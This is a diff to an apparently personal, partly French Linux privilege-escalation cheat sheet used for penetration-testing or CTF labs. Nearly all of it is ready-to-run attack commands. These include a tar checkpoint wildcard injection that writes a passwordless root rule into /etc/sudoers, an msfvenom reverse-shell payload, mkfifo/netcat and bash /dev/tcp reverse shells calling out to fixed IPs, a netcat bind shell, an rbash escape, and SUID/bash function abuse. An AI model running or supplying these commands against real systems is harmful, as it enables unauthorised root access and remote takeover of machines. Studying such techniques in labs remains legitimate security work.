@@ -27,6 +27,7 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 then search suspect SUID in GTFOBINS
 
+### SOME OF THE SUID MAY BE VULNERABLE : BE CAREFUL
 
 ### KNOWN EXPLOIT : 
 looking for the exploit in exploit-db.com or google ...
@@ -37,6 +38,7 @@ looking for the exploit in exploit-db.com or google ...
 
 The  executable is identical to /usr/local/bin/suid-env  
 except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.  
+***Note that backup script are often scheduled in crontab***
 ```bash
 /bin/bash --version -> verify the version is under 4.2-048
 ```
@@ -45,6 +47,14 @@ function /usr/sbin/service { /bin/bash -p; }
 export -f /usr/sbin/service
 /usr/local/bin/suid-env2
 ```
+
+other example
+```bash
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+echo "/var/www/html"  > --checkpoint=1
+```
+
 ### ABUSING SHELL FEATURE #2
 (will not work on bash version 4.4 and above)  
 (vuln with debugging bash enabled)  
@@ -93,6 +103,25 @@ mkpasswd -m sha-512 newpasswordhere
 ### SHELL ESCAPE : https://gtfobins.github.io
 ```bash
 sudo -l  
+```
+
+### RBASH ESCAPE : 
+To view allowed command :
+```bash
+compgen -c
+```
+To escape : 
+```bash
+vi
+:set shell=/bin/sh
+:shell
+```
+or just try to open a new shell with one of those
+```bash
+bash 
+zsh
+csh 
+sh 
 ```
 
 ### EXLOITING CRON JOBS :
@@ -165,13 +194,13 @@ cat /usr/local/bin/compress.sh
 REVERSE root SHELL
 on créee un payload qu'on envoie avec un serv python ou en copier coller (en php par ex):
 ```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
-chmod +x /home/user/shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.14.34 LPORT=444 -f elf -o shell.elf
+chmod +x /tmp/shell.elf
 ```
 on cree des fichiers qui seront executés comme des <flag> de la commande tar
 ```bash
-touch /home/user/--checkpoint=1
-touch /home/user/--checkpoint-action=exec=shell.elf
+touch /tmp/--checkpoint=1
+touch /tmp/--checkpoint-action=exec=shell.elf
 ```
 on setup un netcat et on attend
 ```
@@ -416,6 +445,9 @@ newroot:$6$K9AELjcE4suxukCp$vNLveaks59l46HZOT5TCaxMa1xI6agxYmAFE9CMWCY9/LtBWhzlK
 sudo -l 
 ```
 - Droits sur /etc/sudoers  
+```bash
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+```
 ***user ALL = (root) NOPASSWD: ALL***
 ### /etc/group
 - Droits sur /etc/group  
@@ -439,6 +471,17 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.3.225 1234 >/tmp/f
 bash -i >& /dev/tcp/10.11.3.225/1234 0>&1
 ```
 
+### BIND SHELL :
+*** Remote ***
+```bash
+nc -nlvp 51337 -e /bin/bash
+```
+
+*** Local ***
+```bash
+nc IP 51337
+```
+
 
 ### STABILISER UN REVERSE SHELL
 ```bash
@@ -455,7 +498,7 @@ scp [filename] [username]@[IP of remote machine ]:[directory to upload to on rem
 ```bash
 scp remoteuser@remoteIP:path/to/remote/file localdir/
 ```
-##### AES Encryt
+##### AES Encryt to encrypte any file
 ```bash
 gpg --cipher-algo [encryption type] [encryption method] [file to encrypt]
 gpg --cipher-algo AES-256 --symmetric secret.txt
@@ -464,7 +507,7 @@ gpg --cipher-algo AES-256 --symmetric secret.txt
 ```bash
 mysql -u [username] -p -h [host ip]
 ```
-View a .sql file (depuis mysql) /!\ il fait être dans le dosser du fichier
+**View a .sql file (depuis mysql) /!\ il fait être dans le dosser du fichier**
 ```bash
 source file.sql
 ```
